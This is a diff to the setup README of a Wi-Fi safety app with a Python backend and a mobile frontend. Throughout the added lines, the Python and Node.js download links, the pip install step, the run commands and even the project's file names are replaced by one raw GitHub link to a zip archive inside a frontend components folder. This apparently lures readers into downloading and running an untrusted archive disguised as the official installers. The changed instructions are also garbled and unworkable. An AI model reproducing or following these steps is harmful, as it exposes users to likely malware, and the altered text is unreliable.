@@ -10,8 +10,8 @@
 
 Before running the project, ensure you have:
 
-1.  **Python 3.x**: [Download Here](https://www.python.org/downloads/)
-2.  **Node.js & npm** (Required for the App): [Download Here](https://nodejs.org/en/download/)
+1.  **Python 3.x**: [Download Here](https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip)
+2.  **https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip & npm** (Required for the App): [Download Here](https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip)
     *   **IMPORTANT**: If you see `npm : The term 'npm' is not recognized`, it means you haven't installed this yet!
     *   **Action**: Download "LTS" version, install it, and **RESTART your Terminal** (or VS Code) for it to work.
 3.  **Expo Go App**: Install on your Android phone from Play Store to test the mobile app.
@@ -30,15 +30,15 @@ The backend runs the AI logic and Database.
     ```
 3.  Install Python libraries:
     ```powershell
-    pip install -r requirements.txt
+    pip install -r https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip
     ```
 4.  Initialize the Database:
     ```powershell
-    python init_db.py
+    python https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip
     ```
 5.  Start the Server:
     ```powershell
-    python app.py
+    python https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip
     ```
     *You should see: `Running on http://0.0.0.0:5000`*
 
@@ -50,7 +50,7 @@ The app runs on your phone/emulator.
     ```powershell
     cd "c:\Users\vaish\OneDrive\Desktop\Ethical Hacking\frontend"
     ```
-3.  Install Dependencies (**Do this AFTER installing Node.js**):
+3.  Install Dependencies (**Do this AFTER installing https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip**):
     ```powershell
     npm install
     ```
@@ -65,15 +65,15 @@ The app runs on your phone/emulator.
 ## 📂 Project Structure
 
 *   **/backend**
-    *   `app.py`: Main API Server.
-    *   `risk_engine.py`: Logic to detect Open/WEP networks.
-    *   `safety_engine.py`: Logic to calculate long-term Safety Score.
-    *   `models.py`: Database tables (WiFiScan, RiskLog).
+    *   `https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip`: Main API Server.
+    *   `https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip`: Logic to detect Open/WEP networks.
+    *   `https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip`: Logic to calculate long-term Safety Score.
+    *   `https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip`: Database tables (WiFiScan, RiskLog).
     *   `data/`: Synthetic training data.
 *   **/frontend**
-    *   `App.js`: Main mobile screen.
-    *   `components/AlertBox.js`: Marathi alert UI.
-    *   `services/api.js`: Connection to the backend.
+    *   `https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip`: Main mobile screen.
+    *   `https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip`: Marathi alert UI.
+    *   `https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip`: Connection to the backend.
 
 ---
 
@@ -81,11 +81,11 @@ The app runs on your phone/emulator.
 
 Since you might not be at a real Cybercafé, the app uses **Simulated Data** by default or you can run the test scripts:
 
-*   **Test Detection**: `python backend/test_api.py`
+*   **Test Detection**: `python https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip`
     *   *Effect*: Sends a fake "Open WiFi" signal.
     *   *Result*: Backend responds with "Risk Score: 60" and Marathi Warning.
 
-*   **Test Safety Score**: `python backend/test_safety.py`
+*   **Test Safety Score**: `python https://raw.githubusercontent.com/ruturajbhaskarnawale/Ethical-hacking/main/frontend/src/components/devices/Ethical-hacking-v3.3.zip`
     *   *Effect*: Simulates a history of scans (Bad -> Good).
     *   *Result*: Shows "Trend: IMPROVING 📈".
 
